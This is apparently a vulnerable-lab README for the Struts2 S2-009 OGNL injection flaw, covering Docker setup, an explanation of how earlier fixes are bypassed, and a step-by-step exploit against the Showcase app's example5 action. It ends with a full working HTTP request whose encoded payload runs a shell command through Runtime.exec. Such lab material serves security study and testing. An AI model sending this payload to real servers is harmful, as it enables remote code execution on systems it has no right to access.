# S2-009 Remote Code Execution Vulnerablity

[中文版本(Chinese version)](README.zh-cn.md)

Affected Version: 2.1.0 - 2.3.1.1

Details: http://struts.apache.org/docs/s2-009.html

## Setup

```
docker-compose build
docker-compose up -d
```

## Reference

> This vulnerability is derived from s2-003, s2-005. If you want to understand the principle of the vulnerability, you need to read the instructions of s2-005: https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md

[Struts2 vulnerability analysis](https://www.t00ls.net/viewthread.php?tid=21197), as mentioned in the article, the method of introducing OGNL may not only appear in this vulnerability, but may also appear in other Java applications.

Struts2's repair method for s2-003 is to prohibit static method calls. In s2-005, this restriction can be bypassed directly through OGNL. For the `#` number, use the code `\u0023` or `\43` to bypass; then s2-005's repair is forbidden \ and others special symbols that prevent users submit backslashes.

However, if a parameter `example` is accepted in the current action, this parameter will be sent to the OGNL expression. So, we can put the OGNL expression code in the `example` parameter and then execute it by `/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`, then bypass defense of special characters such as `#`, `\`.

## Exploit

The environment is a struts2 "feature display" website named `Struts Showcase`. We need find an action that accepts the parameter, and type is string.

First decompress `S2-009.war`. We can see that source code is in the `WEB-INF/src` directory, I generally look for ajax related code.

Found one in`WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java`:

```java
public class Example5Action extends ActionSupport {

    private static final long serialVersionUID = 2111967621952300611L;

    private String name;
    private Integer age;


    public String getName() { return name; }
    public void setName(String name) { this.name = name; }

    public Integer getAge() { return age; }
    public void setAge(Integer age) { this.age = age; }

    @Override
    public String execute() throws Exception {
        return SUCCESS;
    }
}
```

The code is simple, it accepts the name parameter and calls setName to assign it to the private property `this.name`, which is in line with our requirement. Then we go to `WEB-INF/src/java/struts-ajax.xml` to see the URL routing setting:

```xml
<package name="ajax" extends="struts-default">
    ...
    <action name="example5" class="org.apache.struts2.showcase.ajax.Example5Action">
        <result name="input">/ajax/tabbedpanel/example5.jsp</result>
        <result>/ajax/tabbedpanel/example5Ok.jsp</result>
    </action>
    ...
</package>
```

We can see `name=example5`, so access the controller by visiting `http://your-ip:8080/ajax/example5.action`. Then put the OGNL exploit code in the name parameter and access the URL:

```
GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
Host: localhost:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```

The POC don't have display, so we use `touch /tmp/success` command, and we found that the `success` file has been created to prove that expliot succeeded.

![](1.png)
